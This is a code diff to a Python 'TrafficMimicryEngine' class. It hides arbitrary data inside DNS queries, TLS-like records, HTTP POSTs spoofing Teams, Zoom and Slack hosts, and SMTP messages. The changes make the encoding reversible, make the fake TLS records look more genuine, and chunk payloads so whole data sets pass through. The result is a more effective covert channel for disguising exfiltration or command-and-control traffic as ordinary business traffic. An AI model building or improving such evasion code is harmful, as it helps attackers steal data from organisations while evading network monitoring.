@@ -166,8 +166,11 @@ class TrafficMimicryEngine:
 
         header = struct.pack(">HHHHHH", txn_id, flags, questions, answers, authority, additional)
 
-        # Encode data as DNS name (base32-like encoding)
-        encoded = "".join(chr(97 + (b % 26)) for b in data[:60])  # a-z only
+        # FIX: Use base32 encoding instead of lossy chr(97 + (b % 26))
+        # base32 is reversible and uses a-z2-7 which fits DNS label constraints
+        import base64
+
+        encoded = base64.b32encode(data[:50]).decode().lower().rstrip("=")
         chunks = [encoded[i : i + 63] for i in range(0, len(encoded), 63)]
 
         question = b""
@@ -208,16 +211,13 @@ class TrafficMimicryEngine:
 
     def _encapsulate_tls(self, data: bytes, template: Dict) -> bytes:
         """Encapsulate data in TLS-like format"""
+        # FIX: Remove fake TLS record number - not part of real TLS protocol
         # TLS record header: Content Type, Version, Length
         content_type = 0x17  # Application Data
         version = 0x0303  # TLS 1.2
         length = min(len(data), 16384)
 
         header = struct.pack(">BHH", content_type, version, length)
-
-        # Fake TLS record number (monotonically increasing)
-        record_num = random.randint(0, 2**48)
-        header += struct.pack(">Q", record_num)[:6]
 
         # XOR data with random key (simulating encryption)
         key = bytes([random.randint(0, 255) for _ in range(16)])
@@ -229,24 +229,20 @@ class TrafficMimicryEngine:
         """Encapsulate data in HTTP request format"""
         import base64
 
-        # HTTP POST request
-        path = random.choice(
-            [
-                "/api/v1/sync",
-                "/api/v2/update",
-                "/api/v3/health",
-                "/api/v1/metrics",
-                "/api/v2/config",
-                "/api/v1/status",
-            ]
-        )
+        # FIX: Chunk data instead of truncating
+        # Split into multiple requests if data is large
+        chunk_size = 1000
+        chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]
+        if not chunks:
+            chunks = [b""]
 
-        encoded_data = base64.b64encode(data[:1000]).decode()
+        # Use first chunk for this request
+        encoded_data = base64.b64encode(chunks[0]).decode()
 
         headers = "\r\n".join(f"{k}: {v}" for k, v in template["headers"].items())
 
         request = (
-            f"POST {path} HTTP/1.1\r\n"
+            f"POST /api/v1/sync HTTP/1.1\r\n"
             f"Host: {random.choice(['teams.microsoft.com', 'zoom.us', 'api.slack.com'])}\r\n"
             f"{headers}\r\n"
             f"Content-Length: {len(encoded_data)}\r\n"
@@ -263,7 +259,13 @@ class TrafficMimicryEngine:
         sender = f"noreply@{random.choice(['company.com', 'corp.net', 'enterprise.org'])}"
         recipient = f"admin@{random.choice(['company.com', 'corp.net', 'enterprise.org'])}"
 
-        encoded_data = base64.b64encode(data[:500]).decode()
+        # FIX: Chunk data instead of truncating
+        chunk_size = 500
+        chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]
+        if not chunks:
+            chunks = [b""]
+
+        encoded_data = base64.b64encode(chunks[0]).decode()
 
         message = (
             f"EHLO mail.company.com\r\n"
